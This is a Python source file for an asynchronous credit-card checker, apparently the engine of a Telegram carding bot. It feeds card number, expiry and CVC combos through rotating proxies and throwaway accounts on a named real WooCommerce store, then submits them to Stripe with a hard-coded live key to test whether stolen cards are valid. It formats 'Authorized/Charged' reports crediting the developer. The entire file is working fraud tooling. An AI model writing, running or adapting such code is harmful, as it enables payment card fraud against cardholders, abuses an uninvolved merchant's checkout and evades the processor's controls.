import aiohttp
import asyncio
import re
import random
import string
import os
import logging
from datetime import datetime

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

class AdvancedCardChecker:
    def __init__(self):
        self.proxy_pool = []
        self.load_proxies()
        self.request_timeout = aiohttp.ClientTimeout(total=70)
        self.max_concurrent = 3
        self.stripe_key = "pk_live_51JwIw6IfdFOYHYTxyOQAJTIntTD1bXoGPj6AEgpjseuevvARIivCjiYRK9nUYI1Aq63TQQ7KN1uJBUNYtIsRBpBM0054aOOMJN"
        self.bin_cache = {}
        self.admin_username = "FNxElectra"

    def load_proxies(self):
        if os.path.exists('proxies.txt'):
            with open('proxies.txt', 'r') as f:
                self.proxy_pool = [line.strip() for line in f if line.strip()]

    async def fetch_nonce(self, session, url, pattern, proxy=None):
        try:
            async with session.get(url, proxy=proxy) as response:
                html = await response.text()
                match = re.search(pattern, html)
                if match:
                    return match.group(1)
                return None
        except Exception as e:
            logger.error(f"Nonce fetch error: {str(e)}")
            return None

    def generate_random_account(self):
        name = ''.join(random.choices(string.ascii_lowercase, k=10))
        numbers = ''.join(random.choices(string.digits, k=4))
        return f"{name}{numbers}@yahoo.com"

    async def fetch_bin_info(self, bin_number):
        try:
            if bin_number in self.bin_cache:
                return self.bin_cache[bin_number]
            
            async with aiohttp.ClientSession() as session:
                async with session.get(f'https://bins.antipublic.cc/bins/{bin_number}') as response:
                    if response.status == 200:
                        data = await response.json()
                        self.bin_cache[bin_number] = {
                            'scheme': data.get('brand', 'N/A').capitalize(),
                            'type': data.get('type', 'N/A'),
                            'brand': data.get('brand', 'N/A').capitalize(),
                            'prepaid': 'N/A',  # Not provided by API
                            'country': data.get('country_name', 'N/A'),
                            'bank': data.get('bank', 'N/A'),
                            'level': data.get('level', 'N/A'),
                            'country_flag': data.get('country_flag', '')
                        }
                        return self.bin_cache[bin_number]
                    else:
                        logger.error(f"BIN lookup failed with status {response.status}")
                        return None
        except Exception as e:
            logger.error(f"BIN lookup error: {str(e)}")
            return None

    async def format_approval_message(self, combo, bin_info, check_time, user=None):
        bin_info = bin_info or {}
        username = user.username if user and user.username else user.full_name if user else 'Scraper'
        return f"""
<b>𝐀𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝✅</b>

[ϟ]𝘾𝘼𝙍𝘿 -» <code>{combo}</code>
[ϟ]𝙎𝙏𝘼𝙏𝙐𝙎 -» 𝐂𝐡𝐚𝐫𝐠𝐞𝐝 1$
[ϟ]𝙂𝘼𝙏𝙀𝙒𝘼𝙔 -» <code>𝐒𝐭𝐫𝐢𝐩𝐞</code>
<b>[ϟ]𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 -»: <code>𝐂𝐡𝐚𝐫𝐠𝐞𝐝 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲</code></b>

━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━

[ϟ]𝘽𝙄𝙉 -» <code>{bin_info.get('scheme', 'N/A')} {bin_info.get('type', '')}</code>
[ϟ]𝘽𝘼𝙉𝙆 -» <code>{bin_info.get('bank', 'N/A')}</code>
<b>[ϟ]𝘾𝙊𝙐𝙉𝙏𝙍𝙔 -» <code>{bin_info.get('country', 'N/A')}</code></b>

━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━

[⌬]𝙏𝙄𝙈𝙀 -» <code>{check_time:.2f}s</code>
<b>[⌬]𝐏𝐑𝐎𝐗𝐘 -» [ LIVE ✅ ]</b>

━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━

[⌬]𝐂𝐇𝐄𝐂𝐊𝐄𝐃 𝐁𝐘 -» @{username}
[⌬]𝐃𝐄𝐕 -» https://t.me/{self.admin_username}
[み]𝗕𝗼𝘁 -» @FN_CHECKERR_BOT
"""

    async def process_line(self, user_id, combo, semaphore):
        start_time = datetime.now()
        async with semaphore:
            try:
                if len(combo.split("|")) != 4:
                    return None

                proxy = random.choice(self.proxy_pool) if self.proxy_pool else None
                bin_number = combo[:6]
                bin_info = await self.fetch_bin_info(bin_number)
                
                async with aiohttp.ClientSession(timeout=self.request_timeout) as session:
                    # Nonce fetching
                    nonce = await self.fetch_nonce(session, 
                        'https://www.dragonworksperformance.com/my-account',
                        r'name="woocommerce-register-nonce" value="(.*?)"',
                        proxy=proxy
                    )
                    if not nonce:
                        return None

                    # Account registration
                    email = self.generate_random_account()
                    reg_data = {
                        "email": email,
                        "woocommerce-register-nonce": nonce,
                        "_wp_http_referer": "/my-account/",
                        "register": "Register"
                    }
                    async with session.post(
                        'https://www.dragonworksperformance.com/my-account',
                        data=reg_data,
                        proxy=proxy
                    ) as response:
                        if response.status != 200:
                            return None

                    # Payment nonce
                    payment_nonce = await self.fetch_nonce(session,
                        'https://www.dragonworksperformance.com/my-account/add-payment-method/',
                        r'"createAndConfirmSetupIntentNonce":"(.*?)"',
                        proxy=proxy
                    )
                    if not payment_nonce:
                        return None

                    # Stripe processing
                    card_data = combo.split("|")
                    stripe_data = {
                        "type": "card",
                        "card[number]": card_data[0],
                        "card[cvc]": card_data[3],
                        "card[exp_year]": card_data[2][-2:],
                        "card[exp_month]": card_data[1],
                        "billing_details[address][postal_code]": "10009",
                        "billing_details[address][country]": "US",
                        "key": self.stripe_key
                    }
                    async with session.post(
                        'https://api.stripe.com/v1/payment_methods',
                        data=stripe_data,
                        proxy=proxy
                    ) as stripe_res:
                        stripe_json = await stripe_res.json()
                        if 'id' not in stripe_json:
                            return None
                        payment_id = stripe_json['id']

                    # Payment confirmation
                    confirm_data = {
                        "action": "create_and_confirm_setup_intent",
                        "wc-stripe-payment-method": payment_id,
                        "_ajax_nonce": payment_nonce,
                    }
                    async with session.post(
                        'https://www.dragonworksperformance.com/?wc-ajax=wc_stripe_create_and_confirm_setup_intent',
                        data=confirm_data,
                        proxy=proxy
                    ) as confirm_res:
                        confirm_json = await confirm_res.json()
                        if confirm_json.get("success", False) and confirm_json.get("data", {}).get("status", "") == "succeeded":
                            check_time = (datetime.now() - start_time).total_seconds()
                            return {
                                'combo': combo,
                                'message': await self.format_approval_message(combo, bin_info, check_time),
                                'bin_info': bin_info,
                                'check_time': check_time
                            }
                        return None

            except Exception as e:
                logger.error(f"Processing error: {str(e)}")
                return None

    async def check_card(self, combo):
        """Standalone method to check a single card and return formatted result if approved."""
        user_id = "scraper"  # Dummy user_id for scrapper checks
        semaphore = asyncio.Semaphore(self.max_concurrent)
        result = await self.process_line(user_id, combo, semaphore)
        return result
